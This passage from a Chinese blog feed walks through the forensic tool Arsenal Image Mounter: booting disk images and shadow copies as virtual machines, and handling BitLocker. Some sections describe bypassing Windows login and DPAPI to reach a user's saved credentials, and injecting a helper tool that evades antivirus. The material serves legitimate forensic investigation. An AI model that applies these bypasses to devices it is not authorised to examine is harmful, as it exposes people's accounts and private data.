src="/2021/03/23/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/2%E7%A3%81%E7%9B%98%E6%8C%82%E8%BD%BD/Arsenal_Image_Mounter/1616480758922-0d33445d-e57a-4741-bf0b-a63374f705e3.png" class="" title="image"><p>上述步骤提供了使用AIM挂载磁盘映像的快速介绍。在下一节中，我们将介绍如何将AIM安装的磁盘映像启动到虚拟机中。</p><h3 id="官方教程-（专业版）在虚拟机中挂载镜像"><a href="#官方教程-（专业版）在虚拟机中挂载镜像" class="headerlink" title="官方教程-（专业版）在虚拟机中挂载镜像"></a>官方教程-（专业版）在虚拟机中挂载镜像</h3><p>本节将介绍如何将AIM安装的磁盘映像启动到虚拟机中。接下来的三段直接从“ readme.txt”文件中引用，解释了AIM如何将磁盘映像启动到虚拟机中。启动VM – 使用选定的AIM安装磁盘启动Hyper-V虚拟机。在使用此功能之前，应先以写临时模式挂载磁盘映像，该功能旨在使在虚拟机中引导磁盘映像的内容比其他方法更高效，可靠和有用。AIM将确定是将磁盘映像作为第一代虚拟机还是第二代虚拟机启动–请参阅<a href="https://docs.microsoft.com/en-us/windows-server/virtualization/hyper-v/plan/should-i-create-a-generation-1-or-2-virtual-machine-in-hyper-v">https://docs.microsoft.com/en-us/windows-server/virtualization/hyper-v/plan/should-i-create-a-generation-1-or-2-virtual-machine-in-hyper-v</a> 有关两代的更多详细信息。该虚拟机由2个CPU，一半宿主机可用RAM（最大4GB），两个网络适配器（默认情况下未连接），一个DVD-ROM（不带任何附件映像）和AIM挂载磁盘作为主要IDE或SCSI HD。AIM在Windows 8.1 / 10（和Server 2012 R2 / 2016）x64上可用全部功能，并且要求Hyper-V角色在物理硬件上运行，而不是在虚拟机中运行。可以从<a href="https://docs.microsoft.com/en-us/virtualization/hyper-v-on-windows/quick-start/enable-hyper-v">https://docs.microsoft.com/zh-cn/virtualization/hyper-v-on-windows/quick-start/enable-hyper-v</a>获得Microsoft有关在Windows 10上安装Hyper-V的信息。AIM在安装Hyper-V方面的配置是“使用CMD和DISM启用Hyper-V”方法。如果不确定Hyper-V是否正在运行，则在命令提示符下“ sc query HvService”的输出可能会有所帮助。 </p><ol><li>确保已使用安装选项“写入临时磁盘设备”在AIM中挂载了磁盘映像，如上文“挂载磁盘映像”部分所述。</li></ol><img src="/2021/03/23/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/2%E7%A3%81%E7%9B%98%E6%8C%82%E8%BD%BD/Arsenal_Image_Mounter/1616480884775-b1787dcf-6bf0-4b40-a0c9-0037ec69bda1.png" class="" title="image"><ol><li>以写临时模式挂载磁盘映像后，有两种方法可以启动虚拟机：</li></ol><p>在AIM主界面的底部，有一组快速访问按钮，其中一个是“启动VM”。单击/按“启动VM”以启动虚拟机启动过程。</p><img src="/2021/03/23/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/2%E7%A3%81%E7%9B%98%E6%8C%82%E8%BD%BD/Arsenal_Image_Mounter/1616480884659-c0db3433-e491-4199-895a-66e74349fafd.png" class="" title="image"><p>或者从“高级-&gt;在虚拟机中启动…”下的“ AIM”菜单中选择。</p><img src="/2021/03/23/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/2%E7%A3%81%E7%9B%98%E6%8C%82%E8%BD%BD/Arsenal_Image_Mounter/1616480885343-5060d63c-24b8-43ba-a664-e951f9f7c336.png" class="" title="image"><ol><li>将显示“作为虚拟机启动”窗口，其中选中了多个默认选项（取决于所选的特定磁盘映像），如下面的屏幕快照所示。根据您的特定需求调整选项。在这种情况下，我们将使用默认值。 </li></ol><img src="/2021/03/23/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/2%E7%A3%81%E7%9B%98%E6%8C%82%E8%BD%BD/Arsenal_Image_Mounter/1616480884926-648f79a4-6a76-410c-9d6d-bc6e130eb358.png" class="" title="image"><p>以下是直接从“ readme.txt”文件中更详细描述的“启动VM”选项。</p><ul><li><p>选择启动虚拟机后，AIM将提供与启动虚拟机有关的各种选项。</p></li><li><p>配置网络连接，以使其断开连接（即完全隔离），在VM之间共享，在VM与主机之间共享或设置为具有外部NAT的默认交换机。</p></li><li><p>启用来宾服务以在VM和主机之间提供复制/粘贴和其他功能。当虚拟机和主机之间的隔离是首选时，不建议这样做。</p></li><li><p>检查文件系统和引导环境，必要时进行修复和调整。如果此选项可用（未显示为灰色），则建议您不要取消选择它。</p></li><li><p>禁用/挂起受BitLocker保护的卷，以便在VM运行后无需再次将其解锁。</p></li><li><p>注入AIM虚拟机工具并调整启动驱动程序。某些磁盘映像可能很难直接引导到虚拟机中，因此AIM可以将* 1小型应用程序注入运行Windows * 2虚拟机中。AIM虚拟机工具可以显示帐户列表（没有明显的文件夹结构或没有重要注册表信息的帐户未在AIM虚拟机工具中列出，因为实际上没有什么可登录和/或无法这样做的），并且可以还可以从登录屏幕打开管理命令提示符。AIM虚拟机工具将在Windows XP上自动启动，并且可以通过Windows Vista / 7/8 / 8.1 / 10 * 3上的“轻松访问”图标进行访问。</p></li><li><p>使用包括策略调整在内的多种技术绕过Windows身份验证* 4，以便任何密码输入都可以使用。支持使用多种身份验证（包括密码，PIN，生物识别，图像和智能卡）的本地，Microsoft（云），Active Directory和Azure Active Directory帐户。如果要求或原始特权不可用，将为帐户提供管理特权。请注意，要访问Windows中的某些内容（例如EFS加密的文件和文件夹以及缓存的登录凭据），您将需要破解而不是绕过帐户身份验证* 5。</p></li><li><p>绕过数据保护API（DPAPI），它提供对上次登录用户的受DPAPI保护的内容（例如网站，网络共享和应用程序凭据以及受保护的文件和文件夹）的无缝访问（特别是与AIM的Windows身份验证旁路配合使用）通过加密文件系统（EFS）。通常，在用户成功登录Windows后，才可以使用受DPAPI保护的内容，但是AIM的DPAPI绕过功能使其在没有用户凭据的情况下就可用。在某些情况下，当AIM首次将具有本地或Microsoft（云）帐户的Windows 10 x64系统启动到虚拟机中时，此选项将可用。请注意，此选项当前最适合单用户系统，并且不会在重新启动后持续存在。</p></li><li><p>使用WinDbg启动Windows内核调试。</p></li><li><ul><li><em>1AIM将在虚拟机内执行防病毒规避，以确保AIM虚拟机工具正常运行。</em></li><li><em>2名为“ AIM_MODIFIED.txt”的文件将放置在AIM虚拟机工具已进行调整的每个Windows卷的根目录上。这些调整是设计临时的，基于“写入临时…”安装。</em></li><li><em>3根据您的防病毒软件和设置，您可能需要将AIM的文件夹和/或可执行文件（ArsenalImageMounter.exe和aim_cli.exe）排除/白名单和/或暂时禁用实时保护，以确保AIM虚拟机工具将被正确注入。您可能还需要指示防病毒软件在VM启动时忽略/允许“ utilman.exe”威胁。</em></li><li><em>4并非总是可以为某些状态下的缓存域帐户标识权威的DOMAIN \ USER组合，因此AIM可以创建DOMAIN \ USER组合以方便访问那些帐户。AIM虚拟机工具将以红色显示AIM创建的DOMAIN \ USER组合。</em></li><li><em>5对于Active Directory帐户，如果有域控制器可用，则很容易在它与客户端之间建立虚拟网络（所有网络都在AIM启动的虚拟机中运行），这将允许您重置帐户密码从域控制器。以这种方式重置密码将使您能够访问客户端上以前无法访问的项目，例如缓存的登录凭据以及EFS加密的文件和文件夹。</em></li></ul></li></ul><p>*<br>*</p><p><strong>启动虚拟机失败消息</strong></p><p>如果看到错误消息“虚拟机发生故障”，则可能您未安装Hyper-V或它无法正常运行。如果未安装Hyper-V，请删除AIM中当前安装的所有磁盘映像，关闭AIM，然后安装Hyper-V。成功安装Hyper-V之后，重复前面的步骤，以写临时模式安装磁盘映像，然后启动虚拟机。</p><img src="/2021/03/23/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/2%E7%A3%81%E7%9B%98%E6%8C%82%E8%BD%BD/Arsenal_Image_Mounter/1616480985292-cf964084-4f48-496a-bc71-3d9288b50176.png" class="" title="image"><ol><li>继续经过“作为虚拟机启动”窗口之后，在虚拟机准备过程中将出现几个窗口。</li></ol><ul><li>如果AIM确定需要修复文件系统，则将显示命令提示符窗口。在此阶段，无需您进行任何交互。</li></ul><img src="/2021/03/23/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/2%E7%A3%81%E7%9B%98%E6%8C%82%E8%BD%BD/Arsenal_Image_Mounter/1616480985253-a843786e-c1c0-4a31-a9d1-a6d870d8b481.png" class="" title="image"><p>命令提示符窗口消失后，将出现“磁盘未脱机”消息窗口。选择“是”。磁盘必须置于离线模式才能与虚拟机一起使用。</p><img src="/2021/03/23/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/2%E7%A3%81%E7%9B%98%E6%8C%82%E8%BD%BD/Arsenal_Image_Mounter/1616480986649-022c7746-3c35-44ef-9881-d1c4b3046f6a.png" class="" title="image"><ol><li>磁盘脱机后，将显示“虚拟机连接”窗口。现在可以通过单击“开始”来启动虚拟机。</li></ol><img src="/2021/03/23/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/2%E7%A3%81%E7%9B%98%E6%8C%82%E8%BD%BD/Arsenal_Image_Mounter/1616480985423-21ae83e4-7748-4240-87d7-42349e13a5ae.png" class="" title="image"><p>启动后，虚拟机将开始引导至Windows（或其他操作系统，具体取决于已安装的磁盘映像中包含的操作系统）。</p><img src="/2021/03/23/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/2%E7%A3%81%E7%9B%98%E6%8C%82%E8%BD%BD/Arsenal_Image_Mounter/1616480985294-6ed31bc5-2f38-4949-8192-c3af63cbf908.png" class="" title="image"><ol><li>我们已经启动了虚拟机，现在处于Windows登录屏幕，该屏幕似乎要求用户’Hunter’拥有密码。您可能不知道该帐户的密码。</li></ol><img src="/2021/03/23/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/2%E7%A3%81%E7%9B%98%E6%8C%82%E8%BD%BD/Arsenal_Image_Mounter/1616480986099-97070a67-3bee-40f4-a128-38ade9f6cf19.png" class="" title="image"><ol><li>在尝试登录默认用户帐户之前，让我们首先检查一下Hunter磁盘映像中有多少个用户帐户（以及类型！）。这可以通过在Windows登录屏幕上选择“轻松访问”图标来完成，以显示“ AIM虚拟机工具”窗口。标识了一个用户帐户，其UTC时间，帐户类型，用户帐户配置文件路径和Windows SID值具有“上次登录”的日期和时间。下面的屏幕快照显示了“ AIM虚拟机工具”窗口中的默认选项。请注意，“ AIM虚拟机工具”窗口底部的两个单选按钮显示为灰色。</li></ol><img src="/2021/03/23/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/2%E7%A3%81%E7%9B%98%E6%8C%82%E8%BD%BD/Arsenal_Image_Mounter/1616480985545-ea3ccf69-2779-4e81-89f0-17a347ac3ed6.png" class="" title="image"><ol><li>如果选择显示用户帐户信息的行，则将激活下面显示为灰色的按钮，如下面的屏幕截图所示。现在，我们已经使用AIM虚拟机工具标识了用户帐户，我们可以单击“返回登录屏幕”或单击右上角的“ X”关闭窗口。</li></ol><img src="/2021/03/23/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/2%E7%A3%81%E7%9B%98%E6%8C%82%E8%BD%BD/Arsenal_Image_Mounter/1616480986467-ef23ea41-c3c9-4afa-9d78-a1ee268630a0.png" class="" title="image"><ol><li>使用AIM的“绕过Windows身份验证”（如果之前选中此选项，则无需知道用户帐户的密码）。单击“密码”字段中的向右箭头，或按键盘上的“ Enter”。</li></ol><img src="/2021/03/23/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/2%E7%A3%81%E7%9B%98%E6%8C%82%E8%BD%BD/Arsenal_Image_Mounter/1616480985325-f97d5819-ace2-45ad-9648-ac164984ab81.png" class="" title="image"><p>接下来的两个屏幕快照演示了Windows身份验证被绕过然后访问用户的桌面的情况。</p><img src="/2021/03/23/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/2%E7%A3%81%E7%9B%98%E6%8C%82%E8%BD%BD/Arsenal_Image_Mounter/1616480985485-c6a9fad9-13b0-461e-9455-7cae7b0faa00.png" class="" title="image"><img src="/2021/03/23/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/2%E7%A3%81%E7%9B%98%E6%8C%82%E8%BD%BD/Arsenal_Image_Mounter/1616480986489-d9562379-cfa2-4a1b-a626-a2949ddba890.png" class="" title="image"><h3 id="官方教程-挂载卷镜像副本（VSC）"><a href="#官方教程-挂载卷镜像副本（VSC）" class="headerlink" title="官方教程-挂载卷镜像副本（VSC）"></a>官方教程-挂载卷镜像副本（VSC）</h3><p>数字取证从业人员可以通过启用来宾服务来在虚拟机中运行第三方工具，这将允许VM和主机之间进行文件传输，或者使用其他方法（例如将磁盘连接到虚拟机或利用PowerShell Direct）。有关这些选项的更多详细信息，请参见AIM自述文件。</p><img src="/2021/03/23/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/2%E7%A3%81%E7%9B%98%E6%8C%82%E8%BD%BD/Arsenal_Image_Mounter/1616510944508-a5e10e5d-2847-4e7a-b57f-e31fdfe00625.png" class="" title="image"><p>接下来，我们将演示VSC的安装（从AIM安装的磁盘映像中）。</p><p>卷影副本（VSC）对数字取证从业者尤其有用。它们可能包含有价值的数据，这些数据存在于文件系统的先前版本中，而不再存在于当前文件系统中。</p><ol><li>我们将首先以写入临时模式挂载收集的磁盘映像。</li><li>挂载磁盘映像后，我们转到<strong>“高级-&gt;卷卷影副本…”。</strong></li></ol><img src="/2021/03/23/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/2%E7%A3%81%E7%9B%98%E6%8C%82%E8%BD%BD/Arsenal_Image_Mounter/1616481352342-e9f25d4f-838a-4581-90d2-16c6a17ff1b6.png" class="" title="image"><ol><li>这将打开“卷影复制选项”窗口。默认情况下，“标准卷影副本安装”和所有VSC被选中。仔细阅读每个选项的说明，以确保按预期方式装入卷影副本。</li></ol><img src="/2021/03/23/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/2%E7%A3%81%E7%9B%98%E6%8C%82%E8%BD%BD/Arsenal_Image_Mounter/1616481352419-baab5206-4085-4f19-9918-8ba57cc6d888.png" class="" title="image"><ol><li>无论选择了一个还是多个VSC，AIM都会请求一个文件夹，用于安装VSC。在“浏览文件夹”窗口中，确定要将VSC挂载的位置，然后按OK。</li></ol><img src="/2021/03/23/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/2%E7%A3%81%E7%9B%98%E6%8C%82%E8%BD%BD/Arsenal_Image_Mounter/1616481352411-e521ac94-5cd7-4f96-8c6a-9a72435bd6fa.png" class="" title="image"><ol><li>在这种情况下，选择了收集的磁盘映像中的两个VSC，并且选择安装它们的位置是Desktop。现在可以将VSC作为一系列文件夹进行浏览，并且可以使用第三方工具来分析或镜像已安装的VSC。</li></ol><img src="/2021/03/23/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/2%E7%A3%81%E7%9B%98%E6%8C%82%E8%BD%BD/Arsenal_Image_Mounter/1616481352474-534c2e45-df4e-4a97-87b4-d67a693f39c2.png" class="" title="image"><ol><li>选择“标准卷影副本装载”将快速装载VSC，但不会公开Windows文件系统图元文件（例如$MFT，$LogFile，$UsnJrnl等），并且不会绕过文件系统安全性。在下面显示的屏幕快照中对此进行了演示，该屏幕快照显示两个VSC中均不存在NTFS图元文件。</li></ol><img src="/2021/03/23/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/2%E7%A3%81%E7%9B%98%E6%8C%82%E8%BD%BD/Arsenal_Image_Mounter/1616481353109-5deb8f70-848e-4b23-8245-cd4f2c5af9fe.png" class="" title="image"><ol><li>如果要访问NTFS图元文件以进行分析和成像，请选择选项“使用Windows文件系统驱动程序旁路进行卷影复制安装”。使用此选项，VSC会与DiscUtils NTFS驱动程序（而不是Windows NTFS驱动程序）一起安装，并且会显示NTFS图元文件。请记住，AIM会提示您输入用于安装VSC的文件夹位置。</li></ol><img src="/2021/03/23/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/2%E7%A3%81%E7%9B%98%E6%8C%82%E8%BD%BD/Arsenal_Image_Mounter/1616481352690-481a941e-bf2d-4c9f-9bae-4c70d450124f.png" class="" title="image"><p>“使用Windows文件系统驱动程序旁路安装卷影副本”选项将使AIM开始缓存目录结构的过程。这不如“标准卷影副本安装”那样快。您将看到在缓存目录结构时，AIM非常忙。</p><img src="/2021/03/23/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/2%E7%A3%81%E7%9B%98%E6%8C%82%E8%BD%BD/Arsenal_Image_Mounter/1616481352485-9d79eb5a-9dd7-47e4-9277-a4dae2603109.png" class="" title="image"><ol><li>如果决定使用“写入临时卷影复制装载”选项，则将装载VSC，就像它们都是“真实”磁盘一样，并且清楚地标识了它们的装载点。</li></ol><img src="/2021/03/23/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/2%E7%A3%81%E7%9B%98%E6%8C%82%E8%BD%BD/Arsenal_Image_Mounter/1616481352395-c77ae215-0f2f-4083-bbef-bb719e7902ad.png" class="" title="image"><p>挂载的VSC将出现在Windows资源管理器中，在这种情况下为驱动器号“ I”和“ J”。可以使用您选择的映像工具对安装的这些VSC进行物理或逻辑映像，甚至可以将其启动到虚拟机中，我们将在后面讨论。</p><ol><li>可以通过突出显示相关的AIM安装的磁盘映像并选择“删除”或选择“全部删除”来删除已安装的VSC。</li></ol><img src="/2021/03/23/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/2%E7%A3%81%E7%9B%98%E6%8C%82%E8%BD%BD/Arsenal_Image_Mounter/1616481352422-e9de6c35-254e-42bd-a124-cef90468867f.png" class="" title="image"><p>到此，对VSC安装选项进行了简要回顾。在下一部分中，我们将演示如何将VSC从虚拟机启动AIM安装的磁盘映像。</p><h3 id="官方教程-（专业版）作为虚拟机启动卷镜像副本（VSC）"><a href="#官方教程-（专业版）作为虚拟机启动卷镜像副本（VSC）" class="headerlink" title="官方教程-（专业版）作为虚拟机启动卷镜像副本（VSC）"></a>官方教程-（专业版）作为虚拟机启动卷镜像副本（VSC）</h3><p>本节将介绍如何从安装了AIM的磁盘映像作为虚拟机启动VSC。我们在本演练的“安装磁盘映像”和“安装卷影复制”部分中介绍的步骤是相关的。</p><ol><li>首先，我们以写临时模式挂载获取的磁盘映像。</li></ol><img src="/2021/03/23/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/2%E7%A3%81%E7%9B%98%E6%8C%82%E8%BD%BD/Arsenal_Image_Mounter/1616481352583-149b6355-5c5a-4275-ab4b-0f8cfb5588b7.png" class="" title="image"><ol><li>接下来，我们使用“卷影复制”选项“写入临时卷影复制安装”来挂载VSC。</li></ol><img src="/2021/03/23/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/2%E7%A3%81%E7%9B%98%E6%8C%82%E8%BD%BD/Arsenal_Image_Mounter/1616481352450-5aafd068-0594-4e37-b2de-c709b4116f3d.png" class="" title="image"><ol><li>在AIM界面中，请记住首先选择要作为虚拟机启动的VSC，然后使用“启动VM”功能。在“作为虚拟机启动”窗口中，接受选中的默认值，然后选择“确定”。</li></ol><p>磁盘映像安装选项：临时写入</p><img src="/2021/03/23/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/2%E7%A3%81%E7%9B%98%E6%8C%82%E8%BD%BD/Arsenal_Image_Mounter/1616481352438-5515f447-9ac4-4a58-a6c0-97805ac582d2.png" class="" title="image"><ol><li>已安装的VSC出于启动VM的目的而处于脱机状态。</li></ol><img src="/2021/03/23/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/2%E7%A3%81%E7%9B%98%E6%8C%82%E8%BD%BD/Arsenal_Image_Mounter/1616481352327-ed8dcac7-eed6-4323-a14e-541490c5905d.png" class="" title="image"><ol><li>现在，VSC已启动到虚拟机中，并且我们已经使用AIM的Windows身份验证旁路访问了用户的桌面。</li></ol><img src="/2021/03/23/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/2%E7%A3%81%E7%9B%98%E6%8C%82%E8%BD%BD/Arsenal_Image_Mounter/1616481352290-b8469740-beb4-4765-a8ad-b2e5f9d04737.png" class="" title="image"><h3 id="官方教程-（专业版）BitLocker管理"><a href="#官方教程-（专业版）BitLocker管理" class="headerlink" title="官方教程-（专业版）BitLocker管理"></a><strong>官方教程-（专业版）BitLocker管理</strong></h3><p>AIM的BitLocker菜单（专业模式）允许数字取证从业人员解锁受BitLocker保护的卷，挂起受BitLocker保护的卷，禁用（完全解密）受BitLocker保护的卷以及完全解密受BitLocker保护的卷，然后保存完全解密的磁盘映像…，以便可以在其他（商业或开源）数字取证工具中轻松使用该映像。</p><img src="/2021/03/23/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/2%E7%A3%81%E7%9B%98%E6%8C%82%E8%BD%BD/Arsenal_Image_Mounter/1616481665729-6484df0c-5a95-471d-ad91-5ba30c8d48a6.png" class="" title="image"><h3 id="官方教程-（专业版）-启动虚拟机以解锁或删除完整磁盘加密"><a href="#官方教程-（专业版）-启动虚拟机以解锁或删除完整磁盘加密" class="headerlink" title="官方教程-（专业版）**启动虚拟机以解锁或删除完整磁盘加密**"></a><strong>官方教程-（专业版）**</strong>启动虚拟机以解锁或删除完整磁盘加密**</h3><p>AIM可用于将包含各种全盘加密（尤其是流行的数字取证工具不支持的加密）的磁盘映像启动到虚拟机，从而使您可以与全盘加密的“预启动环境”进行交互-换句话说，是一种小型操作系统，由全磁盘加密使用，在主操作系统之前运行。然后，根据全盘加密的类型，您可能会具有一些选项，其中包括解锁和删除全盘加密以及各种密钥恢复方法。</p><h3 id="官方教程-（专业版）-分流"><a href="#官方教程-（专业版）-分流" class="headerlink" title="官方教程-（专业版）**分流**"></a><strong>官方教程-（专业版）**</strong>分流**</h3><p>使用AIM的启动VM功能（专业模式），研究人员或数字取证从业人员可以从用户的角度查看操作系统。使用取证工作站，研究人员或数字取证从业人员可以对磁盘图像进行分类，并确定是否存在轻松实现的目标。这种方法面临的挑战是，例如，无法轻松查看已删除的工件和NTFS图元文件。这种方法应与数字取证分析工具的使用相平衡，该工具可以更全面地查看文件系统。</p><p>分流用例背后的目的是通过允许调查人员协助案例审查来协助机构或公司解决积压的案件。这不一定是解决案件积压的最佳解决方案，而是一个值得考虑的想法。Humbly指出，对于不断增加的案件积压，没有单一的解决方案。</p><h3 id="官方教程-（专业版）-实时系统分析"><a href="#官方教程-（专业版）-实时系统分析" class="headerlink" title="官方教程-（专业版）**实时系统分析**"></a><strong>官方教程-（专业版）**</strong>实时系统分析**</h3><p>将AIM安装的磁盘映像或VSC启动到虚拟机（专业模式）的功能对于检查实时系统非常有用。实时系统上的监视过程，文件系统和网络活动可能非常有价值，尤其是在涉及恶意软件的情况下。</p><h3 id="官方教程-（专业版）在没有用户凭据的情况下访问DPAPI保护的内容"><a href="#官方教程-（专业版）在没有用户凭据的情况下访问DPAPI保护的内容" class="headerlink" title="官方教程-（专业版）在没有用户凭据的情况下访问DPAPI保护的内容"></a><strong>官方教程-（专业版）</strong><a href="https://arsenalrecon.com/2020/10/introducing-arsenal-image-mounter-v3-3-134-and-dpapi-bypass"><strong>在没有用户凭据的情况下访问DPAPI保护的内容</strong></a></h3><p>什么是DPAPI（数据保护API）保护的内容？从另一则 <a href="https://arsenalrecon.com/2020/10/introducing-arsenal-image-mounter-v3-3-134-and-dpapi-bypass">见解文章中</a>：</p><blockquote><p>“ Microsoft在Windows 2000中发布了DPAPI，因此第三方开发人员（以及Microsoft本身）将拥有可靠，灵活且易于使用的方法来加密和解密数据。DPAPI加密可以基于特定用户（要求使用该用户的Windows登录凭据）或特定系统（要求使用任何用户的Windows登录凭据）。受DPAPI保护的数据可以在Windows计算机的许多位置找到，例如注册表和各种应用程序数据库。在某些情况下，数字取证从业人员很容易确定应用程序如何使用受DPAPI保护的数据，但在其他情况下（例如Dropbox数据库）则更具挑战性，因为DPAPI是保护特定类型数据的较大系统的一部分。 ”</p></blockquote><p>既然您知道受DPAPI保护的内容的价值，那么您也将知道在没有用户凭据的情况下访问该内容的价值。请查看前面提到的“见解”文章，以了解有关AIM的DPAPI旁路的更多信息。</p><h3 id="官方教程-（专业版）-作为虚拟机启动的非Windows磁盘映像"><a href="#官方教程-（专业版）-作为虚拟机启动的非Windows磁盘映像" class="headerlink" title="官方教程-（专业版）**作为虚拟机启动的非Windows磁盘映像**"></a><strong>官方教程-（专业版）**</strong>作为虚拟机启动的非Windows磁盘映像**</h3><p>如果您在本演练的前面提到了您，则将获得有关支持安装多个非Windows文件系统的支持。AIM不仅限于将Windows启动到虚拟机中，还可以将诸如Linux之类的操作系统启动到虚拟机中。如果您要处理的是运行Linux的可疑设备，或者是运行嵌入式Linux的设备（如某些DVR），则这可能非常有用。</p><p>可以在<a href="https://cyberdefenders.org/labs/32%E4%B8%8A%E6%89%BE%E5%88%B0Hunter%E7%A3%81%E7%9B%98%E6%98%A0%E5%83%8F%E3%80%82">https://cyberdefenders.org/labs/32上找到Hunter磁盘映像。</a></p><p>您可以在Arsenal的“<a href="https://arsenalrecon.com/testimonials">推荐”</a>页面上阅读有关数字取证从业人员如何使用AIM的信息。</p><p>您可以在Vimeo Arsenal Image Mounter频道的<a href="https://vimeo.com/channels/1544872/videos%E4%B8%8A%E8%A7%82%E7%9C%8B%E4%B8%80%E4%BA%9BAIM%E5%9F%B9%E8%AE%AD%E8%A7%86%E9%A2%91%E3%80%82">https://vimeo.com/channels/1544872/videos上观看一些AIM培训视频。</a></p><h2 id="视频教程"><a href="#视频教程" class="headerlink" title="视频教程"></a>视频教程</h2><p><a href="https://www.youtube.com/watch?v=VDu8ZYgKeho">https://www.youtube.com/watch?v=VDu8ZYgKeho</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;分子实验室 &lt;a href=&quot;https://molecule-labs.com/&quot;&gt;https://molecule-labs.com/&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;官网：&lt;a href=&quot;https://arsenalre</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="https://xtpeeps.cn/2021/03/22/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/1%E7%A3%81%E7%9B%98%E9%95%9C%E5%83%8F/%E9%95%9C%E5%83%8F%E7%B1%BB%E5%9E%8B%E5%8F%8A%E5%90%84%E4%BA%A7%E5%93%81%E7%89%B9%E6%80%A7%E5%AF%B9%E6%AF%94/"/>
    <id>https://xtpeeps.cn/2021/03/22/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/1%E7%A3%81%E7%9B%98%E9%95%9C%E5%83%8F/%E9%95%9C%E5%83%8F%E7%B1%BB%E5%9E%8B%E5%8F%8A%E5%90%84%E4%BA%A7%E5%93%81%E7%89%B9%E6%80%A7%E5%AF%B9%E6%AF%94/</id>
    <published>2021-03-22T02:51:35.644Z</published>
    <updated>2021-03-22T02:52:16.928Z</updated>
    
